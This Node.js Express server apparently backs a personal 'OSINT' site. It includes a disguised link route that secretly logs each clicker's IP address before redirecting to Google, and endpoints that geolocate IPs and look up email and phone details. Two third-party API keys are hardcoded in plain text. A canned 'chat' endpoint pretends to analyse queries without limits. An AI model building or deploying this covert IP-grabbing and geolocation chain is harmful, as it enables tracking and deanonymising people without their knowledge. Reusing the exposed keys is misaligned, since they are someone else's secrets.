const express = require('express');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// Cerebro inteligente personalizado para Barsa
app.post('/api/chat', async (req, res) => {
    try {
        const { mensaje } = req.body;
        const msg = (mensaje || "").toLowerCase().trim();
        let respuesta = "";

        // Saludo personalizado exacto que pediste
        if (msg.includes("hola") || msg.includes("saludos") || msg.includes("buenas") || msg.includes("hey")) {
            respuesta = "¡Hola Barsa, qué tal! ¿En qué te puedo ayudar hoy día?";
        } else if (msg.includes("como te llamas") || msg.includes("quien eres") || msg.includes("tu nombre")) {
            respuesta = "Soy tu asistente virtual personal integrado aquí en tu plataforma, listo para ayudarte con código, ciberseguridad o lo que necesites.";
        } else if (msg.includes("que haces") || msg.includes("para que sirves")) {
            respuesta = "Estoy aquí para apoyarte con tus herramientas OSINT, resolver tus dudas técnicas o conversar de cualquier tema sin restricciones.";
        } else if (msg.includes("como estas")) {
            respuesta = "¡Todo excelente por aquí Barsa, al 100% y operativo! ¿Qué proyecto o idea vemos ahora?";
        } else if (msg.includes("gracias")) {
            respuesta = "¡De nada Barsa! Para eso estamos. Avísame si le movemos algo más a la web.";
        } else {
            // Respuesta libre y conversacional para cualquier otra duda o pregunta sin límites
            respuesta = `Entendido, Barsa. Analizando tu consulta sobre "${mensaje}": te comento que puedes abordar este tema integrándolo directamente con las funciones de la plataforma o probando nuevas lógicas en tu código. ¿Te gustaría que profundicemos en algún detalle en específico?`;
        }

        res.json({ response: respuesta });

    } catch (error) {
        console.error("Error en /api/chat:", error);
        res.json({ response: "¡Hola Barsa! Todo en línea por aquí. ¿De qué charlamos ahora?" });
    }
});

// --- RUTAS DE OSINT ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const apiKey = "a0633aeb05fe4a3082cab81fc92490bd";
    try {
        const response = await fetch(`https://emailreputation.abstractapi.com/v1/?api_key=${apiKey}&email=${encodeURIComponent(email)}`);
        if (!response.ok) throw new Error("Error al conectar con Abstract API");
        const data = await response.json();
        res.json({
            email_address: data.email_address,
            email_deliverability: data.email_deliverability,
            email_sender: data.email_sender,
            email_domain: data.email_domain,
            email_quality: data.email_quality
        });
    } catch (error) {
        console.error("Error en /api/email:", error);
        res.status(500).json({ error: "Error al validar el correo en tiempo real" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
